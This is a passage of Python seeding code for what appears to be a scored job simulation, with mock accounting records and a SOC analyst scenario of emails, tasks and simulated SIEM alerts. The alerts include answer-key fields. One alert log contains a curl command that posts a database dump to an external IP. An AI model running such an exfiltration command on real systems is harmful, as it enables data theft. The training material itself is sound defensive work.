        {"acc":"5025","name":"Bank Charges & Interest","dr":2527.50,"cr":0,"bal":2527.50},
        {"acc":"5030","name":"Utilities","dr":284.10,"cr":0,"bal":284.10},
    ]
    pnl={
        "period":"March 2026",
        "revenue":[
            {"acc":"4000","name":"Sales — Services","amount":105800.00},
            {"acc":"4200","name":"Other Income (interest)","amount":84.20},
        ],
        "revenue_total":105884.20,
        "expenses":[
            {"acc":"2100","name":"Payroll","amount":28400.00},
            {"acc":"5005","name":"Office Rent","amount":4500.00},
            {"acc":"5001","name":"Office Supplies","amount":5380.90},
            {"acc":"5010","name":"Software & IT","amount":2723.00},
            {"acc":"5006","name":"Travel & Conferences","amount":2036.00},
            {"acc":"5025","name":"Bank Charges & Interest","amount":2527.50},
            {"acc":"5015","name":"Professional Fees & Insurance","amount":892.00},
            {"acc":"5020","name":"Logistics & Couriers","amount":612.00},
            {"acc":"5030","name":"Utilities","amount":284.10},
        ],
        "expenses_total":47355.50,
        "net_profit":58528.70,
    }
    balance_sheet={
        "as_of":"2026-03-31",
        "assets":{
            "current":[
                {"acc":"1001","name":"Bank Current Account","amount":84093.70},
                {"acc":"1100","name":"Trade Receivables","amount":18200.00},
                {"acc":"1200","name":"VAT Recoverable","amount":4300.00},
                {"acc":"1400","name":"Petty Cash","amount":350.00},
            ],
            "current_total":106943.70,
            "fixed":[
                {"acc":"1300","name":"Office Equipment","amount":14200.00},
            ],
            "fixed_total":14200.00,
            "total":121143.70,
        },
        "liabilities":{
            "current":[
                {"acc":"2300","name":"Trade Payables","amount":12840.00},
                {"acc":"2100","name":"Wages Payable","amount":4800.00},
                {"acc":"2200","name":"VAT Payable","amount":8150.00},
            ],
            "current_total":25790.00,
            "long_term":[
                {"acc":"2400","name":"Bank Loan","amount":35000.00},
            ],
            "long_term_total":35000.00,
            "total":60790.00,
        },
        "equity":{
            "items":[
                {"acc":"3000","name":"Share Capital","amount":25000.00},
                {"acc":"3500","name":"Retained Earnings","amount":35353.70},
            ],
            "total":60353.70,
        },
        "total_liabilities_equity":121143.70,
    }
    journal_entries=[
        {"id":"JN-001","date":"2026-03-01","ref":"INV-4801","narrative":"Customer receipt — Nexus Corp","posted_by":"system","status":"posted","lines":[{"acc":"1001","name":"Bank","dr":8500,"cr":0},{"acc":"1100","name":"Trade Receivables","dr":0,"cr":8500}]},
        {"id":"JN-002","date":"2026-03-04","ref":"INV-4821","narrative":"Customer receipt — Crawford & Sons","posted_by":"system","status":"posted","lines":[{"acc":"1001","name":"Bank","dr":11800,"cr":0},{"acc":"1100","name":"Trade Receivables","dr":0,"cr":11800}]},
        {"id":"JN-003","date":"2026-03-05","ref":"PAY-MAR","narrative":"Payroll — March","posted_by":"S. Ahmed","status":"posted","lines":[{"acc":"2100","name":"Wages","dr":28400,"cr":0},{"acc":"1001","name":"Bank","dr":0,"cr":28400}]},
        {"id":"JN-004","date":"2026-03-10","ref":"VAT-Q4","narrative":"HMRC VAT remittance — Q4","posted_by":"S. Ahmed","status":"posted","lines":[{"acc":"2200","name":"VAT Payable","dr":6700,"cr":0},{"acc":"1001","name":"Bank","dr":0,"cr":6700}]},
        {"id":"JN-005","date":"2026-03-12","ref":"RENT-MAR","narrative":"Office rent — March","posted_by":"S. Ahmed","status":"posted","lines":[{"acc":"5005","name":"Office Rent","dr":4500,"cr":0},{"acc":"1001","name":"Bank","dr":0,"cr":4500}]},
        {"id":"JN-006","date":"2026-03-18","ref":"INT-0318","narrative":"HSBC interest credit","posted_by":"system","status":"posted","lines":[{"acc":"1001","name":"Bank","dr":84.20,"cr":0},{"acc":"4200","name":"Other Income","dr":0,"cr":84.20}]},
        {"id":"JN-007","date":"2026-03-21","ref":"EXP-0345","narrative":"Conference ACCA","posted_by":"S. Ahmed","status":"flagged","lines":[{"acc":"5006","name":"Travel & Conferences","dr":1580,"cr":0},{"acc":"1001","name":"Bank","dr":0,"cr":1580}],"note":"Bank shows £1,850 — investigate the £270 variance"},
        {"id":"JN-008","date":"2026-03-24","ref":"INV-4824-DUP","narrative":"Customer receipt — Apex Holdings (DUPLICATE?)","posted_by":"S. Ahmed","status":"flagged","lines":[{"acc":"1001","name":"Bank","dr":12500,"cr":0},{"acc":"1100","name":"Trade Receivables","dr":0,"cr":12500}],"note":"Possibly duplicate of JN-027 — review"},
        {"id":"JN-009","date":"2026-03-26","ref":"LOAN-0326","narrative":"Mortgage interest","posted_by":"system","status":"posted","lines":[{"acc":"5025","name":"Bank Charges & Interest","dr":2400,"cr":0},{"acc":"1001","name":"Bank","dr":0,"cr":2400}]},
        {"id":"JN-010","date":"2026-03-29","ref":"EXP-0346","narrative":"Director's expense reimbursement","posted_by":"S. Ahmed","status":"posted","lines":[{"acc":"5006","name":"Travel & Conferences","dr":456,"cr":0},{"acc":"1001","name":"Bank","dr":0,"cr":456}]},
        {"id":"JN-011","date":"2026-03-30","ref":"INV-4830","narrative":"Customer receipt — ZenithGroup","posted_by":"system","status":"posted","lines":[{"acc":"1001","name":"Bank","dr":9200,"cr":0},{"acc":"1100","name":"Trade Receivables","dr":0,"cr":9200}]},
    ]
    sheets_col.delete_many({"simulation_id":sim_id()})
    sheets_col.insert_one({"id":"s1","simulation_id":sim_id(),"title":"March 2026 Reconciliation","period":"March 2026","bank_statement":bank,"general_ledger":ledger,"discrepancies":discrepancies,"chart_of_accounts":coa,"trial_balance":trial_balance,"pnl":pnl,"balance_sheet":balance_sheet,"journal_entries":journal_entries})
    invoices_col.delete_many({"simulation_id":sim_id()})
    invoices_col.insert_many([
        {"id":"INV-4821","simulation_id":sim_id(),"client":"Crawford & Sons","date":"2026-03-15","amount":12400,"po":"PO-2847","po_amount":11800,"status":"queried","notes":"£600 VAT applied in error — service is VAT exempt.","vat_applied":600,"correct_amount":11800},
        {"id":"INV-4801","simulation_id":sim_id(),"client":"Nexus Corp","date":"2026-03-01","amount":8500,"po":"PO-2820","po_amount":8500,"status":"paid","notes":""},
        {"id":"INV-4812","simulation_id":sim_id(),"client":"TechFlow","date":"2026-03-08","amount":15000,"po":"PO-2830","po_amount":15000,"status":"paid","notes":""},
        {"id":"INV-4825","simulation_id":sim_id(),"client":"Helix Industries","date":"2026-02-21","amount":9800,"po":"PO-2841","po_amount":9800,"status":"overdue","notes":"32 days overdue — chase Helix AP team","correct_amount":9800},
        {"id":"INV-4828","simulation_id":sim_id(),"client":"Brightway Studios","date":"2026-03-19","amount":4150,"po":"PO-2845","po_amount":2075,"status":"queried","notes":"Brightway claim duplicate billing — original INV-4815 already raised","correct_amount":2075},
        {"id":"INV-4830","simulation_id":sim_id(),"client":"ZenithGroup","date":"2026-03-30","amount":9200,"po":"PO-2848","po_amount":9200,"status":"pending","notes":""},
    ])
    if not list(system_events_col.find({"simulation_id":sim_id(),"tool":"sage"}).limit(1)):
        system_events_col.insert_one({"id":"ev_sage1","simulation_id":sim_id(),"type":"outage","tool":"sage","trigger_at":6,"end_at":9,"start_msg":"Sage Accounting will be down for maintenance 11:00-11:30. Save your work.","end_msg":"Sage is back online. Sorry for the disruption.","points_for_report":5,"triggered":False,"resolved":False})

def seed_accountant(cfg):
    emails_col.insert_many([
        {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome! Your first task","body":f"Hi,\n\nWelcome to {cfg['company']}! Your first task is to reconcile the March bank statement against our general ledger. Flag any discrepancies. Need it by end of day.\n\nTeam meeting at 2pm — bring your progress.\n\nBest,\n{cfg['manager']['name']}","time":"09:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e2","simulation_id":sim_id(),"from_name":cfg["client"]["name"],"from_role":cfg["client"]["role"],"from_email":cfg["client"]["email"],"to":"accounts@apexfinancial.com","subject":"Invoice #4821 — amount mismatch","body":"Dear Accounts,\n\nInvoice #4821 shows £12,400 but our PO was for £11,800. Please check. We need to process payment this week.\n\nKind regards,\nJames Crawford","time":"09:30","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e3","simulation_id":sim_id(),"from_name":"HR Team","from_role":"HR","from_email":"hr@apexfinancial.com","to":"you","subject":"Onboarding — complete by lunch","body":"Welcome! Complete by lunchtime:\n1. Read Employee Handbook\n2. Emergency contact form\n3. Sign IT policy\n4. Set up email signature\n\nEmployee ID: APX-2847","time":"08:45","read":False,"replied":False,"priority":"medium","category":"onboarding","requires_action":True},
        {"id":"e4","simulation_id":sim_id(),"from_name":cfg["it"]["name"],"from_role":cfg["it"]["role"],"from_email":cfg["it"]["email"],"to":"you","subject":"System access ready","body":f"Hi, your accounts are set up:\n- Sage: username apx-2847\n- SharePoint: Finance access granted\n- Outlook: configured\n\nCheers, {cfg['it']['name']}","time":"08:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
        {"id":"e5","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Q1 revenue for board pack","body":"Also — pull Q1 revenue from Sage into board pack template. Mark needs it tomorrow. Reconciliation is priority.\n\nThanks, Sarah","time":"10:15","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
        {"id":"e6","simulation_id":sim_id(),"from_name":cfg["teammate"]["name"],"from_role":cfg["teammate"]["role"],"from_email":cfg["teammate"]["email"],"to":"you","subject":"Heads up on the Crawford invoice","body":f"Welcome aboard.\n\nQuick tip on the Crawford & Sons query — their service was reclassified as VAT-exempt in February but our invoice template still adds 20%. Check the £600 line. They've queried this twice before — easy points if you spot it without me telling you.\n\n{cfg['teammate']['name'].split()[0]}","time":"09:45","read":False,"replied":False,"priority":"medium","category":"teammate","requires_action":False},
        {"id":"e7","simulation_id":sim_id(),"from_name":cfg["director"]["name"],"from_role":cfg["director"]["role"],"from_email":cfg["director"]["email"],"to":"finance@apexfinancial.com","subject":"Month-end close — all hands","body":f"Team,\n\nMonth-end close is in 9 working days. I want a clean reconciliation, all queried invoices resolved, and the management accounts pack on my desk by 9am on the 31st.\n\nNew starters: I expect you to be useful, not invisible. Ask if stuck.\n\n{cfg['director']['name']}\n{cfg['director']['role']}","time":"10:45","read":False,"replied":False,"priority":"high","category":"info","requires_action":False},
        {"id":"e8","simulation_id":sim_id(),"from_name":"Accounts Payable","from_role":"AP Team","from_email":"ap@apexfinancial.com","to":"you","subject":"Three supplier invoices pending coding","body":"Hi,\n\nPlease code the following before EOD so we can run Friday's payment batch:\n• SUP-3091  Pinewood Supplies — £4,820 (likely Office expenses)\n• SUP-3092  CloudHost Ltd  — £1,295 (Software/IT)\n• SUP-3093  Premier Couriers — £612 (Logistics)\n\nDrop the codes back to me on this thread.\n\nAP Team","time":"11:00","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
    ])
    tasks_col.insert_many([
        {"id":"t1","simulation_id":sim_id(),"title":"Complete HR onboarding","description":"Handbook, forms, IT policy, email signature","priority":"medium","deadline":"12:00","status":"pending","points":10},
        {"id":"t2","simulation_id":sim_id(),"title":"Reconcile March bank statement","description":"Compare bank vs ledger. Find all discrepancies.","priority":"high","deadline":"17:00","status":"pending","points":40},
        {"id":"t3","simulation_id":sim_id(),"title":"Respond to client invoice query","description":"Crawford & Sons invoice vs PO mismatch.","priority":"high","deadline":"14:00","status":"pending","points":25},
        {"id":"t4","simulation_id":sim_id(),"title":"Prep for 2pm team meeting","description":"Bring reconciliation progress.","priority":"medium","deadline":"14:00","status":"pending","points":10},
        {"id":"t5","simulation_id":sim_id(),"title":"Start Q1 board pack","description":"Pull Q1 revenue into template.","priority":"low","deadline":"tomorrow","status":"pending","points":15},
        {"id":"t6","simulation_id":sim_id(),"title":"Code 3 supplier invoices for AP","description":"SUP-3091/3092/3093 — assign GL codes by EOD.","priority":"medium","deadline":"17:00","status":"pending","points":15},
        {"id":"t7","simulation_id":sim_id(),"title":"Draft month-end close checklist","description":"Director wants a clean close in 9 days. Draft your task list.","priority":"medium","deadline":"tomorrow","status":"pending","points":10},
        {"id":"t8","simulation_id":sim_id(),"title":"Post adjusting entries to ledger","description":"Once discrepancies are flagged, post the correcting journals.","priority":"high","deadline":"17:00","status":"pending","points":20},
        {"id":"t9","simulation_id":sim_id(),"title":"Send rec summary to Sarah","description":"One-page summary: discrepancies found, corrections posted, outstanding items.","priority":"medium","deadline":"17:00","status":"pending","points":15},
    ])
    _seed_accountant_artifacts(cfg)

# ── SOC alert enrichment (realism upgrade) ────────────────────────
# Derives professional SOC-grade fields from the base alert schema at seed
# time. Purely additive: existing fields (severity, status, mitre_tactic,
# mitre_technique) are kept verbatim because scoring, CSS classes, and the
# day-pack filters key off them; the upgraded display variants get new names
# (severity_label, status_label, mitre_tactic_full, mitre_technique_full).

_SOC_TA_CODES = {
    "Reconnaissance": "TA0043", "Resource Development": "TA0042",
    "Initial Access": "TA0001", "Execution": "TA0002", "Persistence": "TA0003",
    "Privilege Escalation": "TA0004", "Defense Evasion": "TA0005",
    "Credential Access": "TA0006", "Discovery": "TA0007",
    "Lateral Movement": "TA0008", "Collection": "TA0009",
    "Exfiltration": "TA0010", "Command and Control": "TA0011", "Impact": "TA0040",
}

_SOC_RULE_NAMES = {
    "brute_force":        "Multiple Failed Logons Followed by Success (Possible Brute Force)",
    "data_exfiltration":  "Abnormal Outbound Data Volume to Untrusted External Host",
    "credential_access":  "Service Account Logon Outside Credential Rotation Policy",
    "phishing":           "Mass Inbound Campaign with Credential-Harvesting URL",
    "malware":            "Known Malware Hash Detected on Endpoint (Threat Intel Match)",
    "ambiguous":          "Anomalous Process/Query Behaviour Requiring Analyst Review",
    "false_positive_travel": "Impossible-Travel Logon Outside Baseline Geography",
}

# Curated threat-intel strings for day-1 external source IPs.
_SOC_IP_REPUTATION = {
    "185.234.72.19": "AbuseIPDB: 97% malicious confidence, RO — 214 reports (data exfil, C2)",
    "203.0.113.42":  "AbuseIPDB: 100% malicious confidence, NL — known Tor exit node",
    "45.62.118.203": "AbuseIPDB: 89% malicious confidence, US — domain registered 4 days ago",
    "41.58.12.90":   "AbuseIPDB: 0% — no reports. Nigerian residential ISP (MTN)",
}

_RFC1918_RE = re.compile(r"^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)")

def _enrich_soc_alert(a: dict) -> dict:
    """Return a copy of alert `a` with SOC-grade presentation fields added.
    Idempotent — skips anything already present. Deterministic — same input
    always produces the same output (detection delay is hashed from id)."""
    out = dict(a)
    aid = str(out.get("id") or "")
    h = int(hashlib.md5(aid.encode()).hexdigest(), 16)

    # alert_id — SOC-2026-XXXX from the trailing digits of the legacy id.
    if "alert_id" not in out:
        m = re.search(r"(\d+)$", aid)
        out["alert_id"] = f"SOC-2026-{int(m.group(1)) if m else h % 10000:04d}"

    # rule_name — curated per threat_type; falls back to a rule-ified title.
    if "rule_name" not in out:
        out["rule_name"] = _SOC_RULE_NAMES.get(out.get("threat_type") or "", out.get("title") or "Unclassified Detection Rule")

    # severity_label / status_label — display variants (legacy fields untouched).
    sev = str(out.get("severity") or "LOW").upper()
    out.setdefault("severity_label", sev.title())          # CRITICAL → Critical
    st = str(out.get("triage_status") or "").lower()
    out.setdefault("status_label",
                   "Closed" if out.get("status") in ("resolved", "closed") else
                   ("In Progress" if st in ("investigating", "in_progress") else "New"))

    # verdict — null until the analyst rules on it.
    out.setdefault("verdict", None)

    # event_time / detection_time — detection lags the event 7–180 s (hash-seeded).
    ts = out.get("timestamp")
    if ts and "event_time" not in out:
        out["event_time"] = ts
        try:
            dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
            out["detection_time"] = (dt + timedelta(seconds=7 + h % 173)).strftime("%Y-%m-%dT%H:%M:%SZ")
        except Exception:
            out["detection_time"] = ts

    # source_ip / dest_ip — straight aliases of the legacy names.
    out.setdefault("source_ip", out.get("src_ip") or "-")
    out.setdefault("dest_ip", out.get("dst_ip") or "-")

    # hostname — the internal asset in play: src_host when the source is
    # internal (RFC1918), otherwise fall back through affected_asset/dst.
    if "hostname" not in out:
        src_ip, src_host = str(out.get("src_ip") or ""), out.get("src_host") or ""
        if _RFC1918_RE.match(src_ip) and src_host and not src_host.startswith("("):
            out["hostname"] = src_host
        else:
            asset = out.get("affected_asset") or ""
            m = re.search(r"\b([A-Z][A-Z0-9]*(?:-[A-Z0-9]+)+)\b", asset)
            out["hostname"] = m.group(1) if m else (asset or src_host or "-")

    out.setdefault("affected_user", out.get("src_user") or "-")

    # log_source — "CrowdStrike Falcon (EDR)" style.
    if "log_source" not in out:
        det, src = out.get("source_detail") or "", out.get("source") or ""
        out["log_source"] = f"{det} ({src})" if det and src and det != src else (det or src or "-")

    out.setdefault("trigger_reason", out.get("description") or out.get("details") or "-")

    # MITRE display variants — "TA0006 Credential Access" / "T1110.001 Password Guessing".
    tac = out.get("mitre_tactic") or ""
    if "mitre_tactic_full" not in out:
        code = _SOC_TA_CODES.get(tac)
        out["mitre_tactic_full"] = f"{code} {tac}" if code else (tac if tac and tac != "-" else "-")
    tech, tname = out.get("mitre_technique") or "", out.get("mitre_name") or ""
    if "mitre_technique_full" not in out:
        out["mitre_technique_full"] = f"{tech} {tname}".strip() if tech and tech != "-" else "-"

    # device_action — inferred from the raw log / source kind.
    if "device_action" not in out:
        raw = (out.get("raw_log") or "").lower()
        if "quarantine" in raw:
            out["device_action"] = "Quarantined"
        elif any(w in raw for w in ("blocked", "deny", "denied", "drop")):
            out["device_action"] = "Blocked"
        else:
            out["device_action"] = "Allowed"

    # ip_reputation — curated intel for known day-1 IPs, else derive.
    if "ip_reputation" not in out:
        src_ip = str(out.get("src_ip") or "")
        if src_ip in _SOC_IP_REPUTATION:
            out["ip_reputation"] = _SOC_IP_REPUTATION[src_ip]
        elif _RFC1918_RE.match(src_ip):
            out["ip_reputation"] = "Internal address — reputation N/A"
        else:
            out["ip_reputation"] = out.get("dst_reputation") or "No threat intel match"

    return out

def seed_cybersecurity(cfg):
    emails_col.insert_many([
        {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome to the SOC — first shift briefing","body":f"Welcome to {cfg['company']}. You're on the morning shift. Check the SIEM dashboard — there are alerts from overnight that need triaging. Flag anything suspicious as HIGH and escalate to me. False positives mark as RESOLVED.\n\nWe have a standup at 11am — bring your triage summary.\n\n{cfg['manager']['name']}","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e2","simulation_id":sim_id(),"from_name":cfg["client"]["name"],"from_role":cfg["client"]["role"],"from_email":cfg["client"]["email"],"to":"soc@shieldwall.io","subject":"URGENT: Possible data breach","body":"We've detected unusual outbound traffic from our production database server. 14GB transferred to an unknown IP between 2am-4am. We need your team to investigate immediately. This could be a breach.\n\nPlease advise on next steps and whether we need to notify the ICO.\n\nRegards,\nCTO, DataFlow Inc","time":"08:30","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e3","simulation_id":sim_id(),"from_name":"HR Team","from_role":"HR","from_email":"hr@shieldwall.io","to":"you","subject":"Security clearance and onboarding","body":"Welcome! Complete by lunch:\n1. Sign NDA and security clearance forms\n2. Set up YubiKey for 2FA\n3. Review incident response playbook\n4. Complete security awareness training\n\nBadge ID: SW-1847","time":"07:45","read":False,"replied":False,"priority":"medium","category":"onboarding","requires_action":True},
        {"id":"e4","simulation_id":sim_id(),"from_name":cfg["it"]["name"],"from_role":cfg["it"]["role"],"from_email":cfg["it"]["email"],"to":"you","subject":"SOC workstation ready","body":f"Hi, your workstation is configured:\n- Splunk SIEM: analyst access\n- Jira: incident tickets\n- VPN: configured\n- Slack: #soc-alerts channel\n\n{cfg['it']['name']}","time":"07:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
        {"id":"e5","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Phishing campaign detected","body":"Heads up — we've seen a phishing campaign targeting our employees. Subject line: 'Urgent: Password Reset Required'. If you see it in the SIEM logs, flag it immediately. Do NOT click any links.\n\nAlso check if any employees clicked — we need a click-through report by 3pm.\n\nAlex","time":"09:15","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e6","simulation_id":sim_id(),"from_name":cfg["teammate"]["name"],"from_role":cfg["teammate"]["role"],"from_email":cfg["teammate"]["email"],"to":"you","subject":"IOCs from last month's similar incident","body":f"Hi,\n\nThe DataFlow exfil pattern looks like the one we worked in March — same destination ASN. I'm pasting the IOCs below. If they match, escalate immediately and don't waste time re-baselining:\n\n• 185.234.72.0/24 — known data-staging infra\n• User-Agent: 'curl/7.64.0' on outbound HTTPS = automated\n• 2-4am window matches their pattern\n\nDocument anything new you find — we maintain the playbook.\n\n{cfg['teammate']['name'].split()[0]}","time":"09:45","read":False,"replied":False,"priority":"medium","category":"teammate","requires_action":False},
        {"id":"e7","simulation_id":sim_id(),"from_name":cfg["director"]["name"],"from_role":cfg["director"]["role"],"from_email":cfg["director"]["email"],"to":"soc@shieldwall.io","subject":"Weekly threat report — due Friday","body":f"All,\n\nThis week's threat report needs:\n1. Top 5 alerts by severity\n2. Phishing campaign summary (employee click-rate)\n3. Open incidents and ETA\n4. New IOCs added to the watchlist\n\nNew starters — get involved. Submit your section to {cfg['manager']['name'].split()[0]} by Thursday EOD.\n\n{cfg['director']['name']}","time":"10:45","read":False,"replied":False,"priority":"high","category":"info","requires_action":False},
        {"id":"e8","simulation_id":sim_id(),"from_name":"Compliance Bot","from_role":"GRC","from_email":"grc@shieldwall.io","to":"you","subject":"ISO 27001 evidence required — 3 controls","body":"Hi,\n\nQuarterly compliance review. We need evidence for the following controls — please attach screenshots/logs in Jira ticket COMP-014:\n\n• A.12.4.1 — Event logging (last 30 days)\n• A.16.1.5 — Response to incidents\n• A.13.1.1 — Network controls\n\nDeadline: Friday 17:00. No exceptions — auditors arrive Monday.\n\nGRC","time":"11:00","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
    ])
    tasks_col.insert_many([
        {"id":"t1","simulation_id":sim_id(),"title":"Complete security onboarding","description":"NDA, YubiKey, playbook review, security training","priority":"medium","deadline":"12:00","status":"pending","points":10},
        {"id":"t2","simulation_id":sim_id(),"title":"Triage overnight SIEM alerts","description":"Review 10 alerts. 3 are real threats, 7 are false positives.","priority":"high","deadline":"11:00","status":"pending","points":40},
        {"id":"t3","simulation_id":sim_id(),"title":"Investigate DataFlow breach report","description":"Analyse the outbound traffic. Determine if it's a real breach.","priority":"high","deadline":"14:00","status":"pending","points":25},
        {"id":"t4","simulation_id":sim_id(),"title":"Prep for 11am standup","description":"Summarise triage results.","priority":"medium","deadline":"11:00","status":"pending","points":10},
        {"id":"t5","simulation_id":sim_id(),"title":"Phishing click-through report","description":"Check SIEM for employees who clicked phishing links.","priority":"high","deadline":"15:00","status":"pending","points":15},
        {"id":"t6","simulation_id":sim_id(),"title":"Cross-check DataFlow IOCs against teammate's notes","description":"Priya pasted IOCs from last month's similar incident. Compare and escalate if match.","priority":"high","deadline":"13:00","status":"pending","points":20},
        {"id":"t7","simulation_id":sim_id(),"title":"Update incident playbook with new IOCs","description":"Document any new indicators you confirmed during triage.","priority":"medium","deadline":"17:00","status":"pending","points":15},
        {"id":"t8","simulation_id":sim_id(),"title":"Submit ISO 27001 evidence (COMP-014)","description":"3 controls — event logging, incident response, network controls. Friday deadline.","priority":"medium","deadline":"Friday","status":"pending","points":15},
        {"id":"t9","simulation_id":sim_id(),"title":"Draft your section of the weekly threat report","description":"Director wants top alerts, phishing summary, open incidents. Due Thursday EOD.","priority":"medium","deadline":"Thursday","status":"pending","points":15},
    ])
    _sim = sim_id()
    siem_col.insert_many([_enrich_soc_alert(a) for a in [
        {"id":"ALERT-2026-0218-001","simulation_id":_sim,"timestamp":"2026-02-18T02:17:33Z","severity":"CRITICAL","confidence":92,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"Large outbound data transfer to unregistered IP","description":"14.2 GB transferred via HTTPS to external IP over 2-hour window during non-business hours.","details":"14.2 GB transferred via HTTPS to external IP over 2-hour window during non-business hours.","src_ip":"10.0.4.22","src_host":"PROD-DB-01","src_user":"svc_backup","dst_ip":"185.234.72.19","dst_geo":"Bucharest, Romania","dst_reputation":"Unregistered — no threat intel match","affected_asset":"Production Database Server (PostgreSQL)","mitre_tactic":"Exfiltration","mitre_technique":"T1048.001","mitre_name":"Exfiltration Over Alternative Protocol: HTTPS","status":"open","triage_status":"unreviewed","sla_hours":1,"is_real_threat":True,"threat_type":"data_exfiltration","correct_action":"escalate","points":20,"related_alerts":["ALERT-2026-0218-003"],"playbook":"IR-EXFIL-001: Data Exfiltration Response","playbook_steps":["Isolate affected host from network immediately","Capture memory dump and disk image","Check svc_backup credentials — when was last password rotation?","Review firewall logs for dst IP 185.234.72.19 — any prior connections?","Notify CISO and initiate P1 incident bridge","Check if data contained PII — if yes, trigger breach notification process"],"raw_log":"Feb 18 02:17:33 PROD-DB-01 crowdstrike[4821]: ALERT severity=critical src=10.0.4.22 dst=185.234.72.19 proto=https bytes_out=14248103936 duration=7234s user=svc_backup process=/usr/bin/curl cmd=\"curl -X POST https://185.234.72.19/upload -d @/tmp/dump_20260218.tar.gz\"","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0218-002","simulation_id":_sim,"timestamp":"2026-02-18T01:45:12Z","severity":"HIGH","confidence":85,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"SSH brute force followed by successful logins","description":"847 failed SSH attempts in 12 minutes followed by 3 successful logins — account likely compromised.","details":"847 failed SSH attempts in 12 minutes against admin/root/deploy. 3 successful logins followed.","src_ip":"203.0.113.42","src_host":"(external — Tor exit, Amsterdam)","src_user":"admin/root/deploy","dst_ip":"10.0.2.18","dst_geo":"London, UK (internal)","dst_reputation":"Known Tor exit node","affected_asset":"STAGING-WEB-02","mitre_tactic":"Credential Access","mitre_technique":"T1110.001","mitre_name":"Brute Force: Password Guessing","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"brute_force","correct_action":"escalate","points":15,"related_alerts":[],"playbook":"IR-CRED-002: Brute Force / Account Compromise","playbook_steps":["Disable affected accounts immediately","Force password reset for admin/root/deploy","Block source IP at firewall","Review login audit log for last 24h","Check for lateral movement from staging-web-02"],"raw_log":"Feb 18 01:45:12 STAGING-WEB-02 sshd[2181]: Failed password for admin from 203.0.113.42 port 51224 ssh2 (847 attempts in window) — followed by Accepted password for admin from 203.0.113.42","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0218-003","simulation_id":_sim,"timestamp":"2026-02-18T01:58:04Z","severity":"HIGH","confidence":78,"source":"SIEM","source_detail":"SIEM Correlation Engine","title":"Service account login with stale credentials","description":"svc_backup logged into PROD-DB-01 — credentials last rotated 387 days ago (policy: 90).","details":"Successful login to PROD-DB-01 from 10.0.4.22 by svc_backup. Credential rotation overdue by 297 days.","src_ip":"10.0.4.22","src_host":"PROD-DB-01","src_user":"svc_backup","dst_ip":"10.0.4.22","dst_geo":"London, UK (internal)","dst_reputation":"Internal","affected_asset":"Production Database Server (PostgreSQL)","mitre_tactic":"Initial Access","mitre_technique":"T1078.001","mitre_name":"Valid Accounts: Default Accounts","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"credential_access","correct_action":"escalate","points":15,"related_alerts":["ALERT-2026-0218-001"],"playbook":"IR-CRED-003: Stale Service Account Login","playbook_steps":["Review last 30d activity for svc_backup","Rotate svc_backup credentials","Confirm whether the login preceded the data exfil event","Cross-check with ALERT-2026-0218-001"],"raw_log":"Feb 18 01:58:04 PROD-DB-01 auth[331]: session opened for user svc_backup by (uid=0); cred_age_days=387; policy_max=90","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0218-004","simulation_id":_sim,"timestamp":"2026-02-18T03:00:21Z","severity":"MEDIUM","confidence":15,"source":"Firewall","source_detail":"Palo Alto PA-5260","title":"Port scan from internal vulnerability scanner","description":"Scheduled Nessus scan against /24 — known maintenance window (CR-2026-0847).","details":"Port scan 10.0.1.100 → 10.0.0.0/24. Nessus scheduled weekly scan.","src_ip":"10.0.1.100","src_host":"SCAN-SERVER-01","src_user":"nessus","dst_ip":"10.0.0.0/24","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"Internal /24","mitre_tactic":"Discovery","mitre_technique":"T1046","mitre_name":"Network Service Discovery","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-SCAN: Scheduled Scan FP","playbook_steps":["Confirm CR-2026-0847 is in change window","Mark as resolved/false positive","No further action needed"],"raw_log":"Feb 18 03:00:21 PA-5260 1,2026/02/18 03:00:21,SCAN,SCAN-SERVER-01,10.0.1.100,10.0.0.0/24,nessus_weekly,id=4 cr=CR-2026-0847","analyst_notes":"","false_positive_indicators":"Scheduled scan — see Change Request CR-2026-0847"},
